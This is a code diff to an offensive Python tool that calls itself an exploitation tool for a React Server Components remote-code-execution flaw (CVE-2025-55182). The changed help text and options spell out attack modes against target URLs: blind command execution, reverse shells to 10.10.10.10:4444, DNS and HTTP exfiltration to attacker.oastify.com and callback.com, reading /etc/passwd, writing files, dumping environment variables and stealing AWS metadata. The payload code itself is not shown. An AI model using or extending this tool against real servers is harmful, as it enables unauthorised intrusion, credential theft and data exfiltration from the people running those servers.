@@ -1,3 +1,9 @@
+#!/usr/bin/env python3
+"""
+React2Shell (CVE-2025-55182) Exploitation Tool
+A unified tool for detection and exploitation of React Server Components RCE
+"""
+
 import requests
 import argparse
 import json
@@ -287,7 +293,6 @@ def print_banner():
 ╚═══════════════════════════════════════════════════════════╝
     """)
 
-
 def print_results(results: List[ScanResult]):
     """Print scan results summary"""
     print("\n" + "="*60)
@@ -351,26 +356,38 @@ Examples:
   # Scan multiple targets
   %(prog)s -l targets.txt detect
   
-  # Execute command
+  # Execute command (blind RCE)
   %(prog)s -u https://target.com exploit -c "whoami"
+  
+  # Execute with output via HTTP callback
+  %(prog)s -u https://target.com exploit -c "whoami" -t output --callback https://callback.com
+  
+  # Execute with output via DNS (best for bug bounty)
+  %(prog)s -u https://target.com exploit -c "whoami:attacker.oastify.com" -t dns_exfil
   
   # Reverse shell
   %(prog)s -u https://target.com exploit -c "10.10.10.10:4444" -t reverse_shell
   
-  # DNS exfiltration
-  %(prog)s -u https://target.com exploit -c "whoami:attacker.oastify.com" -t dns_exfil
+  # Read file with HTTP exfil
+  %(prog)s -u https://target.com exploit -c "/etc/passwd:https://callback.com" -t file_read
+  
+  # Write file
+  %(prog)s -u https://target.com exploit -c "/tmp/test.txt:Hello World" -t write_file
   
   # Impact assessment
   %(prog)s -u https://target.com assess --callback https://attacker.com
   
 Payload types:
-  simple          - Execute simple command
+  simple          - Execute command (blind, no output)
+  output          - Execute with HTTP callback output (requires --callback)
+  dns_exfil       - DNS exfiltration (format: cmd:domain or just domain for whoami)
+  http_exfil      - HTTP exfiltration (format: cmd:callback_url)
   reverse_shell   - Bash reverse shell (format: lhost:lport)
-  dns_exfil       - DNS exfiltration (format: data:domain)
   file_read       - Read file (format: filepath:callback)
+  write_file      - Write file (format: filepath:content)
   env_dump        - Dump environment vars (format: callback)
   aws_metadata    - AWS metadata exfiltration (format: callback)
-  recon           - System reconnaissance (format: callback or empty)
+  recon           - System reconnaissance (format: callback)
   stealth_beacon  - DNS beacon (format: domain)
         """
     )
@@ -387,12 +404,13 @@ Payload types:
     # Exploit options
     parser.add_argument('-c', '--command', help='Command to execute')
     parser.add_argument('-t', '--type', default='simple',
-                       choices=['simple', 'reverse_shell', 'dns_exfil', 'file_read',
-                               'env_dump', 'aws_metadata', 'recon', 'stealth_beacon'],
+                       choices=['simple', 'output', 'reverse_shell', 'dns_exfil', 'http_exfil',
+                               'file_read', 'write_file', 'env_dump', 'aws_metadata', 
+                               'recon', 'stealth_beacon'],
                        help='Payload type (default: simple)')
     
     # Assessment options
-    parser.add_argument('--callback', help='Callback server for assessment')
+    parser.add_argument('--callback', help='Callback server for output/assessment')
     
     # General options
     parser.add_argument('--threads', type=int, default=10,
@@ -452,6 +470,20 @@ Payload types:
     
     elif args.mode == 'exploit':
         results = []
+        
+        # Warn user about blind RCE if using simple type
+        if args.type == 'simple' and not args.callback:
+            print("\n[!] WARNING: Using 'simple' payload type = BLIND RCE")
+            print("[!] Command will execute but you won't see output!")
+            print("\n[i] To see command output, use one of these:")
+            print("    1. Add: -t output --callback http://YOUR_IP:8080")
+            print("    2. Add: -t dns_exfil -c 'whoami:attacker.oastify.com'")
+            print("    3. Add: -t write_file -c '/tmp/output.txt:content'\n")
+            
+            if input("[?] Continue with blind RCE anyway? (yes/no): ").lower() != 'yes':
+                print("[!] Operation cancelled")
+                sys.exit(0)
+        
         for target in targets:
             print(f"[*] Exploiting: {target}")
             result = tool.exploit(target, args.command, args.type, args.callback or "")
